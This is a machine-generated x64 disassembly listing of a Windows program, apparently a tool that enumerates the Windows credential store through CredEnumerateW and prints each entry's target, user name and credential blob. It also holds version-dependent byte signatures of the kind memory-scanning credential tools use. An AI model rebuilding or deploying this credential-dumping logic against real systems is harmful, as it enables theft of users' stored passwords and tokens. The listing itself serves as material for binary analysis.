lea rcx [ rbp - 0x29 ]
call sub_140001ea0
nop
mov [ rbp + 0x27 ] 0x7
mov [ rbp + 0x1f ] rbx
mov [ rbp + 0xf ] bx
lea r8d [ rbx + 0xb ]
lea rdx [ r--data ]
lea rcx [ rbp + 0xf ]
call sub_140001ea0
nop
mov [ rsp + 0x30 ] ebx
mov [ rsp + 0x28 ] 0x5
lea rax [ rbp + 0x37 ]
mov [ rsp + 0x20 ] rax
lea r9d [ rbx + 0x6 ]
lea r8 [ rbp + 0x3f ]
lea rdx [ rbp - 0x29 ]
lea rcx [ rbp + 0xf ]
call sub_1400079e0
mov al 0x1
mov rcx [ rbp + 0x47 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0xd0 ]
add rsp 0xc0
pop rbp
retn
sub_14001a0d0
mov rax rsp
push rbp
push r13
push r14
lea rbp [ rax - 0x138 ]
sub rsp 0x220
mov [ rsp + 0x78 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x118 ] rax
mov [ rbp + 0xf0 ] 0x105b8949
mov [ rbp + 0xf4 ] 0x18738949
mov [ rsp + 0x44 ] 0xc3ed3345
mov [ rbp + 0xf8 ] 0x48f98b48
mov [ rbp + 0xfc ] 0x8b48ca8b
mov [ rbp + 0x100 ] 0xe8da
mov [ rsp + 0x41 ] 0xc3
mov [ rbp + 0x108 ] 0x48da8b48
mov [ rbp + 0x10c ] 0x8b48f98b
mov [ rbp + 0x110 ] 0xe8ca
mov [ rsp + 0x40 ] 0xc3
mov [ rbp + 0xb8 ] 0x7
xor r14d r14d
mov [ rbp + 0xb0 ] r14
mov [ rbp + 0xa0 ] r14w
xor edx edx
mov r8d 0x11c
lea rcx [ rbp - 0x80 ]
call sub_14003d760
mov [ rbp - 0x80 ] 0x11c
lea rcx [ rbp - 0x80 ]
call [ GetVersionExW@IAT ]
test eax eax
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0xc8 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0xe0 ] 0x8
jb r-xdata
mov eax [ rbp - 0x7c ]
cmp eax 0x5
jne r-xdata
cmp [ rbp + 0xb8 ] 0x8
jb r-xdata
mov rcx [ rbp + 0xc8 ]
call j_sub_14003ad04
nop
cmp eax 0x6
jne r-xdata
lea rax [ rbp + 0xa0 ]
mov r9 [ rbp + 0xa0 ]
mov rdx [ rbp + 0xb8 ]
cmp rdx 0x8
cmovae rax r9
lea rbx [ r--data ]
mov r8 [ rbp + 0xb0 ]
cmp rbx rax
jb r-xdata
mov al 0x1
mov rcx [ rbp + 0x118 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x220 ]
mov rbx [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rdi [ r11 + 0x30 ]
mov r12 [ r11 + 0x38 ]
mov rsp r11
pop r14
pop r13
pop rbp
retn
mov rcx [ rbp + 0xa0 ]
call j_sub_14003ad04
mov ebx 0x2e
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov edx [ rbp - 0x7c ]
call sub_140008400
mov rcx rax
movzx edx bx
call sub_14000fe50
mov rcx rax
mov edx [ rbp - 0x78 ]
call sub_140008400
mov rcx rax
call sub_140007970
jmp r-xdata
lea rax [ rbp + 0xa0 ]
mov r9 [ rbp + 0xa0 ]
mov rdx [ rbp + 0xb8 ]
cmp rdx 0x8
cmovae rax r9
lea rbx [ r--data ]
mov r8 [ rbp + 0xb0 ]
cmp rbx rax
jb r-xdata
mov edi 0xc
cmp rdx rdi
jae r-xdata
lea rax [ rbp + 0xa0 ]
cmp rdx 0x8
cmovae rax r9
lea rax [ rax + r8 * 2 ]
cmp rax rbx
jbe r-xdata
mov edi 0xb
cmp rdx rdi
jae r-xdata
lea rax [ rbp + 0xa0 ]
cmp rdx 0x8
cmovae rax r9
lea rax [ rax + r8 * 2 ]
cmp rax rbx
jbe r-xdata
lea rcx [ rbp + 0xa0 ]
cmp rdx 0x8
cmovae rcx r9
mov rax [ r--data ]
mov [ rcx ] rax
mov rax [ r--data ]
mov [ rcx + 0x8 ] rax
mov rax [ r--data ]
mov [ rcx + 0x10 ] rax
mov [ rbp + 0xb0 ] rdi
lea rax [ rbp + 0xa0 ]
cmp [ rbp + 0xb8 ] 0x8
cmovae rax [ rbp + 0xa0 ]
mov [ rax + 0x18 ] r14w
mov edx edi
lea rcx [ rbp + 0xa0 ]
call sub_1400025a0
mov rdx [ rbp + 0xb8 ]
mov r9 [ rbp + 0xa0 ]
lea rax [ rbp + 0xa0 ]
cmp rdx 0x8
cmovae rax r9
sub rbx rax
sar rbx 0x1
cmp r8 rbx
jae r-xdata
lea rcx [ rbp + 0xa0 ]
cmp rdx 0x8
cmovae rcx r9
mov rax [ r--data ]
mov [ rcx ] rax
mov rax [ r--data ]
mov [ rcx + 0x8 ] rax
mov eax [ r--data ]
mov [ rcx + 0x10 ] eax
movzx eax [ r--data ]
mov [ rcx + 0x14 ] ax
mov [ rbp + 0xb0 ] rdi
lea rax [ rbp + 0xa0 ]
cmp [ rbp + 0xb8 ] 0x8
cmovae rax [ rbp + 0xa0 ]
mov [ rax + 0x16 ] r14w
mov edx edi
lea rcx [ rbp + 0xa0 ]
call sub_1400025a0
mov rdx [ rbp + 0xb8 ]
mov r9 [ rbp + 0xa0 ]
lea rax [ rbp + 0xa0 ]
cmp rdx 0x8
cmovae rax r9
sub rbx rax
sar rbx 0x1
cmp r8 rbx
jae r-xdata
lea rax [ rsp + 0x48 ]
mov [ rsp + 0x70 ] rax
mov [ rsp + 0x60 ] 0x7
mov [ rsp + 0x58 ] r14
mov [ rsp + 0x48 ] r14w
or r9 0xffffffffffffffff
xor r8d r8d
lea rdx [ rbp + 0xa0 ]
lea rcx [ rsp + 0x48 ]
call sub_140001dd0
nop
mov [ rbp + 0xe0 ] 0x7
mov [ rbp + 0xd8 ] r14
mov [ rbp + 0xc8 ] r14w
mov r8d 0x8
lea rdx [ r--data ]
lea rcx [ rbp + 0xc8 ]
call sub_140001ea0
mov eax edi
mov r9d ebx
mov [ rsp + 0x30 ] esi
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] r13
mov r8 r12
lea rdx [ rsp + 0x48 ]
lea rcx [ rbp + 0xc8 ]
call sub_1400079e0
jmp r-xdata
sub r8 rbx
mov edi 0xc
cmp r8 rdi
cmova r8 rdi
lea rdx [ r8 + rbx ]
or r8 0xffffffffffffffff
lea rcx [ rbp + 0xa0 ]
call sub_140002190
mov r8 rbx
xor edx edx
lea rcx [ rbp + 0xa0 ]
call sub_140002190
jmp r-xdata
lea rcx [ r--data ]
call sub_140037948
cmp eax 0x1
jne r-xdata
lea r12 [ rbp + 0xf8 ]
lea r13 [ rsp + 0x41 ]
lea esi [ rax - 0xa ]
jmp r-xdata
sub r8 rbx
mov edi 0xb
cmp r8 rdi
cmova r8 rdi
lea rdx [ r8 + rbx ]
or r8 0xffffffffffffffff
lea rcx [ rbp + 0xa0 ]
call sub_140002190
mov r8 rbx
xor edx edx
lea rcx [ rbp + 0xa0 ]
call sub_140002190
jmp r-xdata
lea rcx [ r--data ]
call sub_140037948
lea r12 [ rbp + 0xf0 ]
mov ebx 0x8
lea r13 [ rsp + 0x44 ]
lea edi [ rbx - 0x4 ]
lea esi [ rbx - 0x12 ]
jmp r-xdata
lea r12 [ rbp + 0x108 ]
lea r13 [ rsp + 0x40 ]
lea esi [ rax - 0x15 ]
mov edi 0x1
lea ebx [ rdi + 0x9 ]
mov eax [ rbp - 0x78 ]
test eax eax
jne r-xdata
sub_14001a5e0
mov rax rsp
push rbp
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x5f ]
sub rsp 0xa0
mov [ rbp - 0x39 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x2f ] rax
xor r15d r15d
mov [ rbp - 0x41 ] r15d
mov [ rbp - 0x49 ] r15
lea r9 [ rbp - 0x49 ]
lea r8 [ rbp - 0x41 ]
lea edx [ r15 + 0x1 ]
xor ecx ecx
call [ CredEnumerateW@IAT ]
test eax eax
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0x7 ]
call sub_14000f390
mov rbx rax
lea rdx [ r--data ]
lea rcx [ rw-data ]
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0x1f ] 0x8
jb r-xdata
lea rdx [ r--data ]
lea rsi [ rw-data ]
mov rcx rsi
call sub_14000ac10
mov rcx rax
mov edx [ rbp - 0x41 ]
call sub_140008400
mov rcx rax
call sub_140007970
mov r14d r15d
mov [ rbp - 0x3d ] r15d
mov r12d r15d
cmp [ rbp - 0x41 ] r12d
jbe r-xdata
mov al 0x1
mov rcx [ rbp + 0x2f ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0xa0 ]
mov rbx [ r11 + 0x30 ]
mov rsi [ r11 + 0x38 ]
mov rdi [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
mov rcx [ rbp + 0x7 ]
call j_sub_14003ad04
mov rcx [ rbp - 0x49 ]
call [ CredFree@IAT ]
jmp r-xdata
lea r13d [ r15 + 0x4 ]
inc r14d
mov [ rbp - 0x3d ] r14d
inc r12
cmp r14d [ rbp - 0x41 ]
jb r-xdata
mov edx 0xa
mov rcx rsi
call sub_1400085e0
mov ebx r15d
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
test [ rcx + rsi + 0x10 ] 0x6
jne r-xdata
mov rax [ rbp - 0x49 ]
mov rcx [ rax + r12 * 8 ]
cmp [ rcx + 0x20 ] 0x0
jbe r-xdata
movsxd rcx [ rax + 0x4 ]
add rcx rsi
test ebx ebx
je r-xdata
mov rcx [ rcx + rsi + 0x48 ]
mov rax [ rcx ]
call [ rax + 0x68 ]
cmp eax 0xffffffff
cmove ebx r13d
mov rax [ rw-data ]
mov rax [ rbp - 0x49 ]
mov rbx [ rax + r12 * 8 ]
lea rdx [ r--data ]
mov rcx rsi
call sub_14000ac10
mov rcx rax
mov rdx [ rbx + 0x8 ]
call sub_14000ac10
mov rdi rax
mov edx 0xa
mov rcx rax
call sub_1400085e0
mov ebx r15d
mov rcx [ rdi ]
movsxd rcx [ rcx + 0x4 ]
test [ rcx + rdi + 0x10 ] 0x6
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
test ebx ebx
je r-xdata
mov rcx [ rcx + rdi + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
cmove ebx r13d
xor r8d r8d
call sub_140003120
or edx 0x4
mov rcx [ rbp - 0x49 ]
mov rax [ rcx + r12 * 8 ]
mov rbx [ rax + 0x40 ]
test rbx rbx
je r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov edx 0x7
mov [ rbp - 0x9 ] rdx
mov [ rbp - 0x11 ] r15
mov [ rbp - 0x21 ] r15w
mov rax [ rcx + r12 * 8 ]
mov ecx [ rax + 0x4 ]
dec ecx
cmp ecx 0x5
ja r-xdata
lea rdx [ r--data ]
mov rcx rsi
call sub_14000ac10
mov rcx rax
mov rdx rbx
call sub_14000ac10
mov rcx rax
call sub_140007970
mov rcx [ rbp - 0x49 ]
xor r8d r8d
call sub_140003120
or edx 0x4
movzx eax [ r--data ]
mov [ rbp - 0x21 ] ax
mov [ rbp - 0x11 ] 0x1
lea rax [ rbp - 0x21 ]
cmp rdx 0x8
cmovae rax [ rbp - 0x21 ]
mov [ rax + 0x2 ] r15w
lea r8 [ __dos_header ]
mov ecx [ r8 + rcx * 4 + 0x1ad94 ]
add rcx r8
jmp rcx
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
test ebx ebx
je r-xdata
mov rcx [ rcx + rdi + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
cmove ebx r13d
mov rcx [ r--data ]
mov [ rbp - 0x21 ] rcx
mov eax [ r--data ]
mov [ rbp - 0x19 ] eax
movzx eax [ r--data ]
mov [ rbp - 0x15 ] ax
mov [ rbp - 0x11 ] rdx
lea rax [ rbp - 0x21 ]
cmp rdx 0x8
cmovae rax rcx
mov [ rax + 0xe ] r15w
jmp r-xdata
xor r8d r8d
lea edx [ r8 + 0xf ]
lea rcx [ rbp - 0x21 ]
call sub_1400025a0
lea r11 [ rbp - 0x21 ]
cmp [ rbp - 0x9 ] 0x8
cmovae r11 [ rbp - 0x21 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov eax [ r--data ]
mov [ r11 + 0x18 ] eax
movzx eax [ r--data ]
xor r8d r8d
lea edx [ r8 + 0x12 ]
lea rcx [ rbp - 0x21 ]
call sub_1400025a0
lea r11 [ rbp - 0x21 ]
cmp [ rbp - 0x9 ] 0x8
cmovae r11 [ rbp - 0x21 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
mov eax [ r--data ]
xor r8d r8d
lea edx [ r8 + 0x17 ]
lea rcx [ rbp - 0x21 ]
call sub_1400025a0
lea r11 [ rbp - 0x21 ]
cmp [ rbp - 0x9 ] 0x8
cmovae r11 [ rbp - 0x21 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
mov rax [ r--data ]
mov [ r11 + 0x20 ] rax
mov eax [ r--data ]
mov [ r11 + 0x28 ] eax
movzx eax [ r--data ]
mov [ r11 + 0x2c ] ax
mov [ rbp - 0x11 ] 0x17
lea rax [ rbp - 0x21 ]
cmp [ rbp - 0x9 ] 0x8
cmovae rax [ rbp - 0x21 ]
mov [ rax + 0x2e ] r15w
jmp r-xdata
xor r8d r8d
lea edx [ r8 + 0x12 ]
lea rcx [ rbp - 0x21 ]
call sub_1400025a0
lea r11 [ rbp - 0x21 ]
cmp [ rbp - 0x9 ] 0x8
cmovae r11 [ rbp - 0x21 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
mov eax [ r--data ]
jmp r-xdata
xor r8d r8d
lea edx [ r8 + 0xf ]
lea rcx [ rbp - 0x21 ]
call sub_1400025a0
lea r11 [ rbp - 0x21 ]
cmp [ rbp - 0x9 ] 0x8
cmovae r11 [ rbp - 0x21 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov eax [ r--data ]
mov [ r11 + 0x18 ] eax
movzx eax [ r--data ]
jmp r-xdata
mov rax [ rbp - 0x49 ]
mov rbx [ rax + r12 * 8 ]
lea rdx [ r--data ]
mov rcx rsi
call sub_14000ac10
mov rcx rax
mov rdx [ rbx + 0x48 ]
call sub_14000ac10
mov rdi rax
mov edx 0xa
mov rcx rax
call sub_1400085e0
mov ebx r15d
mov rcx [ rdi ]
movsxd rcx [ rcx + 0x4 ]
test [ rcx + rdi + 0x10 ] 0x6
jne r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rbp - 0x49 ]
mov rbx [ rax + r12 * 8 ]
lea rdx [ r--data ]
mov rcx rsi
call sub_14000ac10
mov rcx rax
lea rdx [ rbp - 0x21 ]
call sub_14000ae70
mov rcx rax
lea rdx [ r--data ]
call sub_14000ac10
mov rcx rax
mov edx [ rbx + 0x4 ]
call sub_140008400
mov rcx rax
mov edx 0x29
call sub_14000fe50
mov rdi rax
mov edx 0xa
mov rcx rax
call sub_1400085e0
mov ebx r15d
mov rcx [ rdi ]
movsxd rcx [ rcx + 0x4 ]
test [ rcx + rdi + 0x10 ] 0x6
jne r-xdata
mov [ r11 + 0x20 ] eax
mov [ rbp - 0x11 ] 0x12
lea rax [ rbp - 0x21 ]
cmp [ rbp - 0x9 ] 0x8
cmovae rax [ rbp - 0x21 ]
mov [ rax + 0x24 ] r15w
jmp r-xdata
mov [ r11 + 0x1c ] ax
mov [ rbp - 0x11 ] 0xf
lea rax [ rbp - 0x21 ]
cmp [ rbp - 0x9 ] 0x8
cmovae rax [ rbp - 0x21 ]
mov [ rax + 0x1e ] r15w
jmp r-xdata
mov rax [ rdi ]
movsxd rcx [ rax + 0x4 ]
add rcx rdi
test ebx ebx
je r-xdata
mov rcx [ rcx + rdi + 0x48 ]
mov rdx [ rcx ]
call [ rdx + 0x68 ]
cmp eax 0xffffffff
cmove ebx r13d
xor r8d r8d
call sub_140003120
or edx 0x4
mov r13b 0x1
mov ebx r15d
mov rax [ rbp - 0x49 ]
lea rcx [ rax + r12 * 8 ]
mov rax [ rcx ]
mov r8d [ rax + 0x20 ]
test r8d r8d
je r-xdata
mov edx [ rcx + 0x10 ]
or edx ebx
cmp [ rcx + 0x48 ] 0x0
jne r-xdata
mov rax [ rbp - 0x49 ]
mov rcx [ rax + r12 * 8 ]
test [ rcx + 0x20 ] 0x1f
je r-xdata
mov r14d 0x30
xor r8d r8d
call sub_140003120
or edx 0x4
test r13b r13b
je r-xdata
mov rcx rsi
call sub_140007970
mov eax r15d
test bl 0x1
je r-xdata
lea eax [ r8 - 0x2 ]
cmp ebx eax
jae r-xdata
cmp [ rbp - 0x9 ] 0x8
jb r-xdata
mov rax [ rbp - 0x49 ]
mov rcx [ rax + r12 * 8 ]
mov r8d [ rcx + 0x20 ]
shr r8 0x1
mov rdx [ rcx + 0x28 ]
mov eax 0x7
mov [ rbp + 0x1f ] rax
mov [ rbp + 0x17 ] r15
mov [ rbp + 0x7 ] r15w
lea rcx [ rbp + 0x7 ]
call sub_140001ea0
nop
lea rdx [ r--data ]
mov rcx rsi
call sub_14000ac10
mov rcx rax
lea rdx [ rbp + 0x7 ]
call sub_14000ae70
mov rcx rax
call sub_140007970
nop
cmp [ rbp + 0x1f ] 0x8
jb r-xdata
test dil dil
setne al
test dil dil
sete al
jmp r-xdata
mov eax 0x1
mov r13d 0x4
mov rcx [ rbp - 0x21 ]
call j_sub_14003ad04
mov rcx [ rbp + 0x7 ]
call j_sub_14003ad04
nop
and r13b al
mov edx 0x2
lea rcx [ rbp - 0x31 ]
call sub_140039e70
mov rcx [ rw-data ]
movsxd rcx [ rcx + 0x4 ]
add rcx rsi
mov rdx [ rax + 0x8 ]
call [ rax ]
mov r11 [ rw-data ]
movsxd rax [ r11 + 0x4 ]
mov [ rax + rsi + 0x58 ] r14w
mov rax [ rw-data ]
movsxd rcx [ rax + 0x4 ]
add rcx rsi
and [ rcx + 0x18 ] 0xfffff9ff
or [ rcx + 0x18 ] 0x800
movzx edx dil
mov rcx rsi
call sub_140010430
mov rcx rax
mov edx 0x20
call sub_14000fe50
inc ebx
test bl 0x1f
jne r-xdata
test eax eax
mov eax r15d
je r-xdata
mov rax [ rbp - 0x49 ]
lea rcx [ rax + r12 * 8 ]
mov rax [ rcx ]
mov r8d [ rax + 0x20 ]
cmp ebx r8d
jb r-xdata
mov rcx rsi
call sub_140007970
mov rdx [ rcx ]
mov ecx ebx
mov rax [ rdx + 0x28 ]
movzx edi [ rcx + rax ]
cmp [ rdx + 0x20 ] 0x1
jbe r-xdata
mov r14d [ rbp - 0x3d ]
sub_14001adb0
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
test rcx rcx
je r-xdata
xor eax eax
mov [ rbx ] rax
mov [ rbx + 0x8 ] rax
mov [ rbx + 0x10 ] rax
add rsp 0x20
pop rbx
retn
call j_sub_14003ad04
sub_14001ade0
push r12
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov rsi rdx
mov rdi rcx
mov rax 0x3fffffffffffffff
cmp rdx rax
jbe r-xdata
mov rax [ rcx + 0x10 ]
sub rax [ rcx ]
sar rax 0x2
cmp rax rdx
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
xor ebx ebx
mov [ rsp + 0x58 ] rbx
test rdx rdx
je r-xdata
mov r8 [ rdi + 0x8 ]
mov rdx [ rdi ]
sub r8 rdx
and r8 0xfffffffffffffffc
mov rcx rbx
call sub_14003a8c0
nop
mov rcx [ rdi ]
mov r12 [ rdi + 0x8 ]
sub r12 rcx
sar r12 0x2
test rcx rcx
je r-xdata
lea rcx [ rdx * 4 ]
call sub_14003ac60
mov rbx rax
mov [ rsp + 0x58 ] rax
test rax rax
jne r-xdata
lea rax [ rbx + rsi * 4 ]
mov [ rdi + 0x10 ] rax
lea rax [ rbx + r12 * 4 ]
mov [ rdi + 0x8 ] rax
mov [ rdi ] rbx
call j_sub_14003ad04
mov [ rsp + 0x58 ] rax
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x28 ]
call sub_14003a774
lea r11 [ r--data ]
mov [ rsp + 0x28 ] r11
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
nop
sub_14001aef0
mov rax rsp
push rbp
lea rbp [ rax - 0x78 ]
sub rsp 0x170
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x60 ] rax
mov rbx rcx
mov [ rsp + 0x28 ] rcx
xor edi edi
mov [ rsp + 0x20 ] edi
mov [ rcx ] rdi
mov [ rcx + 0x8 ] rdi
mov [ rcx + 0x10 ] rdi
mov [ rsp + 0x20 ] 0x1
lea rax [ sub_14001b280 ]
mov [ rbp ] rax
mov esi 0x7
mov [ rbp + 0x20 ] rsi
mov [ rbp + 0x8 ] di
mov rcx [ r--data ]
mov [ rbp + 0x8 ] rcx
mov [ rbp + 0x18 ] 0x4
lea rax [ rbp + 0x8 ]
cmp rsi 0x8
cmovae rax rcx
mov [ rax + 0x8 ] di
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
xor r8d r8d
lea edx [ rdi + 0x4d ]
lea rcx [ rbp + 0x30 ]
call sub_1400025a0
lea rcx [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae rcx [ rbp + 0x30 ]
mov r8d 0x9a
lea rdx [ r--data ]
call sub_14003a8c0
mov [ rbp + 0x40 ] 0x4d
lea rax [ rbp + 0x30 ]
cmp [ rbp + 0x48 ] 0x8
cmovae rax [ rbp + 0x30 ]
mov [ rax + 0x9a ] di
lea rdx [ rbp ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_14001b960 ]
mov [ rbp - 0x60 ] r11
mov [ rbp - 0x40 ] rsi
mov [ rbp - 0x48 ] rdi
mov [ rbp - 0x58 ] di
xor r8d r8d
lea edx [ rdi + 0xb ]
lea rcx [ rbp - 0x58 ]
call sub_1400025a0
lea r11 [ rbp - 0x58 ]
cmp [ rbp - 0x40 ] 0x8
cmovae r11 [ rbp - 0x58 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov eax [ r--data ]
mov [ r11 + 0x10 ] eax
movzx eax [ r--data ]
mov [ r11 + 0x14 ] ax
mov [ rbp - 0x48 ] 0xb
lea rax [ rbp - 0x58 ]
cmp [ rbp - 0x40 ] 0x8
cmovae rax [ rbp - 0x58 ]
mov [ rax + 0x16 ] di
mov [ rbp - 0x18 ] rsi
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
xor r8d r8d
lea edx [ rdi + 0x49 ]
lea rcx [ rbp - 0x30 ]
call sub_1400025a0
lea rcx [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae rcx [ rbp - 0x30 ]
mov r8d 0x92
lea rdx [ r--data ]
call sub_14003a8c0
mov [ rbp - 0x20 ] 0x49
lea rax [ rbp - 0x30 ]
cmp [ rbp - 0x18 ] 0x8
cmovae rax [ rbp - 0x30 ]
mov [ rax + 0x92 ] di
lea rdx [ rbp - 0x60 ]
mov rcx rbx
call sub_140018d50
lea r11 [ sub_14001c010 ]
mov [ rsp + 0x40 ] r11
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x48 ] di
xor r8d r8d
lea edx [ rdi + 0x10 ]
lea rcx [ rsp + 0x48 ]
call sub_1400025a0
lea r11 [ rsp + 0x48 ]
cmp [ rsp + 0x60 ] 0x8
cmovae r11 [ rsp + 0x48 ]
mov rax [ r--data ]
mov [ r11 ] rax
mov rax [ r--data ]
mov [ r11 + 0x8 ] rax
mov rax [ r--data ]
mov [ r11 + 0x10 ] rax
mov rax [ r--data ]
mov [ r11 + 0x18 ] rax
mov [ rsp + 0x58 ] 0x10
lea rax [ rsp + 0x48 ]
cmp [ rsp + 0x60 ] 0x8
cmovae rax [ rsp + 0x48 ]
mov [ rax + 0x20 ] di
mov [ rbp - 0x78 ] rsi
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
xor r8d r8d
lea edx [ rdi + 0x3f ]
lea rcx [ rsp + 0x70 ]
call sub_1400025a0
lea rcx [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rcx [ rsp + 0x70 ]
lea r8d [ rdi + 0x7e ]
lea rdx [ r--data ]
call sub_14003a8c0
mov [ rbp - 0x80 ] 0x3f
lea rax [ rsp + 0x70 ]
cmp [ rbp - 0x78 ] 0x8
cmovae rax [ rsp + 0x70 ]
mov [ rax + 0x7e ] di
lea rdx [ rsp + 0x40 ]
mov rcx rbx
call sub_140018d50
nop
cmp [ rbp - 0x78 ] 0x8
jb r-xdata
mov [ rbp - 0x78 ] rsi
mov [ rbp - 0x80 ] rdi
mov [ rsp + 0x70 ] di
cmp [ rsp + 0x60 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x70 ]
call j_sub_14003ad04
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x58 ] rdi
mov [ rsp + 0x48 ] di
cmp [ rbp - 0x18 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x48 ]
call j_sub_14003ad04
mov [ rbp - 0x18 ] rsi
mov [ rbp - 0x20 ] rdi
mov [ rbp - 0x30 ] di
cmp [ rbp - 0x40 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x30 ]
call j_sub_14003ad04
mov [ rbp - 0x40 ] rsi
mov [ rbp - 0x48 ] rdi
mov [ rbp - 0x58 ] di
cmp [ rbp + 0x48 ] 0x8
jb r-xdata
mov rcx [ rbp - 0x58 ]
call j_sub_14003ad04
mov [ rbp + 0x48 ] rsi
mov [ rbp + 0x40 ] rdi
mov [ rbp + 0x30 ] di
cmp [ rbp + 0x20 ] 0x8
jb r-xdata
mov rcx [ rbp + 0x30 ]
call j_sub_14003ad04
mov rax rbx
mov rcx [ rbp + 0x60 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x170 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
mov rcx [ rbp + 0x8 ]
call j_sub_14003ad04
sub_14001b280
mov rax rsp
push rbp
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x78 ]
sub rsp 0x150
mov [ rsp + 0x68 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x40 ] rax
mov rbx rcx
mov edi 0x20
mov ecx edi
call sub_14003ac60
mov r12 rax
mov [ rsp + 0x58 ] rax
xor esi esi
test rax rax
je r-xdata
mov r12 rsi
mov [ rsp + 0x58 ] rsi
mov [ rax ] rsi
mov [ rax + 0x8 ] rsi
mov [ rax + 0x10 ] rsi
jmp r-xdata
mov r15 rsi
mov [ rax ] rsi
mov [ rax + 0x8 ] rsi
mov [ rax + 0x10 ] rsi
jmp r-xdata
xor edx edx
mov rcx r12
call sub_14000c0b0
mov [ rsp + 0x40 ] al
mov rcx rdi
call sub_14003ac60
mov r15 rax
test rax rax
je r-xdata
mov [ rsp + 0x48 ] esi
cmp [ rcx + 0x18 ] 0x8
jb r-xdata
mov rcx [ rbx ]
cmp rcx [ rbx + 0x8 ]
je r-xdata
xor r8d r8d
mov dl 0x1
lea rcx [ rbp + 0x18 ]
call sub_14000f390
mov rbx rax
